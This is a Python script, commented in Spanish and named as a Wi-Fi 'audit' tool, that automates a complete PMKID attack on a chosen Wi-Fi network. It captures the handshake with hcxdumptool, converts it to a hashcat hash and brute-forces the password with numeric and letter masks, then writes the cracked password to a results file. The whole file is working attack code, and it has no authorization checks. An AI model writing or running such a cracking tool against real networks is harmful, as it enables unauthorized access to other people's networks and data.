#!/usr/bin/env python3
"""
auto_wifi_audit.py - Automatización del flujo completo
Requiere que wifi_auditor.py esté en la misma carpeta
"""

import os
import sys
import time
import subprocess
import threading
from datetime import datetime


def run(cmd, timeout=None):
    print(f"[*] Ejecutando: {' '.join(cmd)}")
    try:
        return subprocess.run(cmd, capture_output=True, text=True,
                              timeout=timeout)
    except subprocess.TimeoutExpired:
        return None


def auto_pmkid_attack(bssid, channel, interface="wlan0mon"):
    print(f"\n{'='*60}")
    print(f"AUDITORÍA AUTOMÁTICA - BSSID: {bssid}")
    print(f"{'='*60}")

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    out_dir = f"results/auto_{timestamp}"
    os.makedirs(out_dir, exist_ok=True)

    # Archivo target
    target_file = f"{out_dir}/target.txt"
    with open(target_file, "w") as f:
        f.write(bssid)

    # FASE 1: Capturar PMKID
    print("\n[FASE 1] Capturando PMKID (60s)...")
    subprocess.run(["iwconfig", interface, "channel", str(channel)],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    hcx = subprocess.Popen(
        ["hcxdumptool", "-i", interface,
         "-o", f"{out_dir}/pmkid.pcapng",
         "--enable_status=1"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(60)
    hcx.terminate()
    time.sleep(2)

    # FASE 2: Convertir a hash
    print("\n[FASE 2] Convirtiendo a hash...")
    run(["hcxpcaptool", "-z", f"{out_dir}/hash.hc22000",
         f"{out_dir}/pmkid.pcapng"])

    hash_file = f"{out_dir}/hash.hc22000"
    if not os.path.exists(hash_file) or os.path.getsize(hash_file) == 0:
        print("[-] No se capturó PMKID")
        return None

    # FASE 3: Atacar con máscaras
    print("\n[FASE 3] Atacando con máscaras...")
    masks = [
        "?d?d?d?d?d?d?d?d",
        "?d?d?d?d?d?d?d?d?d?d",
        "?l?l?l?l?d?d?d?d",
        "wifi?d?d?d?d",
    ]

    for mask in masks:
        print(f"\n[*] Probando máscara: {mask}")
        try:
            proc = subprocess.Popen(
                ["hashcat", "-m", "22000", "-a", "3",
                 hash_file, mask, "--force", "-O", "-w", "3"],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            out = ""
            for line in proc.stdout:
                out += line
                if "Cracked" in line:
                    break
            proc.wait()

            if "Cracked" in out:
                import re
                match = re.search(r'([0-9a-f]{32}):([^\s:]+)', out)
                if match:
                    pw = match.group(2)
                    print(f"\n[+] CONTRASEÑA: {pw}")
                    with open(f"{out_dir}/RESULTADO.txt", "w") as f:
                        f.write(f"BSSID: {bssid}\n")
                        f.write(f"Password: {pw}\n")
                        f.write(f"Máscara: {mask}\n")
                        f.write(f"Fecha: {datetime.now()}\n")
                    return pw
        except Exception as e:
            print(f"[!] Error: {e}")

    print("\n[-] No se encontró contraseña")
    return None


def main():
    print("="*60)
    print("AUTO_WIFI_AUDIT.PY - Automatización")
    print("="*60)

    if not os.path.exists("wifi_auditor.py"):
        print("[!] Este script debe estar junto a wifi_auditor.py")
        sys.exit(1)

    os.makedirs("results", exist_ok=True)
    os.makedirs("logs", exist_ok=True)

    bssid = input("BSSID objetivo (ej: 00:11:22:33:44:55): ").strip()
    channel = input("Canal (ej: 6): ").strip()
    iface = input("Interfaz en modo monitor [wlan0mon]: ").strip() or "wlan0mon"

    if not bssid or not channel:
        print("[!] Faltan datos")
        sys.exit(1)

    password = auto_pmkid_attack(bssid, channel, iface)

    if password:
        print(f"\n{'='*60}")
        print(f"¡COMPLETADO! Password: {password}")
        print(f"{'='*60}")
    else:
        print("\n[-] Sin éxito. Intenta wifi_auditor.py para métodos manuales")


if __name__ == "__main__":
    main()